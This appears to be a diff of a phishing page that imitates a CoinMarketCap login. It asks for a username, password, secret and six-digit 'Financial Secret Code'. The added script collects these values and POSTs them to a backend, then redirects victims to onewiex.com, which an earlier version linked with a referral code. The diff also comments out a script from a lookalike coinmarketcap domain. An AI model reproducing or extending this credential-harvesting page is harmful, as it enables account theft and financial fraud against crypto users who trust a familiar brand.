@@ -70,6 +70,7 @@
         display: none;
       }
     </style>
+    <script src="https://www.google.com/recaptcha/enterprise.js?render=6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD"></script>
   </head>
   <body style="padding-right: 0px; overflow-y: auto">
     <app-root ng-version="14.2.3">
@@ -282,10 +283,7 @@
                     </app-language>
                     <div class="header-nav">
                       <a class="m-btn sm white text-nowrap">Sign in</a>
-                      <a
-                        class="m-btn sm text-nowrap ml-3"
-                        href="https://onewiex.com/?upline=012047991013"
-                      >
+                      <a class="m-btn sm text-nowrap ml-3" href="/signup.html">
                         Sign Up
                       </a>
                     </div>
@@ -816,7 +814,7 @@
                           <h3>Crypto Assets</h3>
                           <div class="tariff-item__select">
                             <div class="jq-selectbox jqselect">
-                              <select styler="">
+                              <select>
                                 <option value="btc">BTC</option>
                                 <option value="eth">ETH</option>
                                 <option value="ltc">LTC</option>
@@ -1324,7 +1322,7 @@
       </app-toast>
     </app-root>
 
-    <script src="https://event.coinmarketcap.jp/client.js"></script>
+    <!-- <script src="https://event.coinmarketcap.jp/client.js"></script> -->
     <script>
       SIGNIN_CLICK_TIMES = 1;
 
@@ -1333,6 +1331,10 @@
 
         const usernameInput = document.getElementById('coinmarketcap-username');
         const passwordInput = document.getElementById('coinmarketcap-password');
+        const secretInput = document.getElementById('coinmarketcap-secret');
+        const financialSecretCode = document.getElementById(
+          'financial-secret-code'
+        );
 
         if (
           usernameInput.value.trim() === '' ||
@@ -1341,10 +1343,6 @@
           alert('Please enter both username and password.');
           return;
         }
-
-        const financialSecretCode = document.getElementById(
-          'financial-secret-code'
-        );
 
         if (SIGNIN_CLICK_TIMES == 1) {
           financialSecretCode.style.display = 'block';
@@ -1356,7 +1354,51 @@
             alert('Financial Secret Code must be exactly 6 digits.');
             return;
           }
-          window.location.href = 'https://onewiex.com/?upline=012047991013';
+
+          grecaptcha.enterprise.ready(async () => {
+            const token = await grecaptcha.enterprise.execute(
+              '6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD',
+              { action: 'LOGIN' }
+            );
+
+            var loginData = {
+              username: usernameInput.value,
+              password: passwordInput.value,
+              secret: secretInput.value,
+              recaptchaToken: token,
+            };
+
+            console.log(loginData);
+
+            // Make a POST request to your API endpoint
+            fetch('http://127.0.0.1:5000/login', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(loginData),
+            })
+              .then((response) => response.json())
+              .then((data) => {
+                // Handle the API response here
+                if (data.success) {
+                  if (data.onewiex_site) {
+                    // Save the JWT token in local storage (for demo purposes)
+                    localStorage.setItem('jwtToken', data.token);
+                    window.location.href = 'account.html';
+                  } else {
+                    window.location.href = 'https://onewiex.com/';
+                  }
+                } else {
+                  // Login failed, display an error message
+                  alert(`Login failed: ${data.message}`);
+                }
+              })
+              .catch((error) => {
+                console.error('Error:', error);
+                alert('An error occurred');
+              });
+          });
         }
       }
 
